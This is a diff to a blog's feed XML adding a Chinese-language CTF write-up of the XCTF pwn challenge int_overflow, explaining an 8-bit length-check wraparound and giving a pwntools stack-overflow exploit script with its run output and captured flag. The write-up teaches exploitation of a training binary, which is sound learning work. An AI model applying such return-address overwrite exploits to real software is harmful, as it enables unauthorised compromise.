@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>xctf int_overflow整数类型的溢出</title>
+    <link href="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/"/>
+    <url>/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/</url>
+    
+    <content type="html"><![CDATA[<h2 id="整数类型的溢出"><a href="#整数类型的溢出" class="headerlink" title="整数类型的溢出"></a>整数类型的溢出</h2><p>以xctf平台的pwn新手区int_overflow为例<br>into 为rename的elf文件</p><h3 id="0X1"><a href="#0X1" class="headerlink" title="0X1"></a>0X1</h3><blockquote><p>file into<br>chmod 777 into<br>./into</p></blockquote><p>先确定into为32位elf文件</p><h3 id="0X2"><a href="#0X2" class="headerlink" title="0X2"></a>0X2</h3><p>win环境下，32位IDA进行分析<br>有明显的后门函数what_is_this()<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic1.png" alt="no1"><br>进入login()后<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic2.png" alt="no2"><br>结合下图看看<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic3.png" alt="no3"><br><br>首先，我们可以发现，目前为止，找不到合适的直接溢出点，read函数都未越界。<br>唯一的落脚点来到strcpy()上，但是，s被限制再4到8个字节大小内，如果想达到栈溢出，覆盖返回地址，却至少需要读取大于dest数组0x14大小的填充数据。<br><strong>这个时候，unsigned __int8 v3是突破口</strong><br>查资料得知，int8的意思是占8个bit，因为是无符号数，范围是0到255之间。<br>回顾一下，check_passwd()函数传入的buf长度，有0x199这么大，足矣我们完成对int8的溢出。<br>截至目前，思路为，将buf的长度控制在256+4~256+8之间，达到v3&gt;3&amp;&amp;v3&lt;=8的条件，同时通过这两百五十多字节的数据布置，完成程序的劫持。<br>编写exp脚本如下</p><blockquote><p>from pwn import*<br>p = remote(“ip_address”,port)<br>p.recv()<br>p.sendline(‘1’)<br>p.recv()<br>p.sendline(‘kawa’)<br>p.recv()<br>payload = b’a’*(0x14) + b’aaaa’ + p32(0x804868b) + b’a’*234<br>p.sendline(payload)<br>p.interactive()</p></blockquote><p>linux中</p><blockquote><p>python3 e.py<br>[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.<br>[+] Opening connection to 111.200.241.244 on port 65136: Done<br>/root/Desktop/e.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘1’)<br>/root/Desktop/e.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘fc’)<br>[*] Switching to interactive mode<br>Hello fc</p></blockquote><p>Please input your passwd:<br>Success<br>cyberpeace{c592ce35706a19933e58ca21a03fb3c8}<br>[*] Got EOF while reading in interactive<br>$  </p><p>结束</p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p><strong>本题重点是需要知道，int8是内存大小为8bit即1字节大小的空间，可以达到int类型溢出。否则无从下手！！！</strong></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>ctf in do♂r</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>NX-ROP</title>
     <link href="/2022/03/02/NX-ROP/"/>
     <url>/2022/03/02/NX-ROP/</url>
@@ -14,7 +33,7 @@
     
     <tags>
       
-      <tag>ctf in door</tag>
+      <tag>ctf in do♂r</tag>
       
     </tags>
     
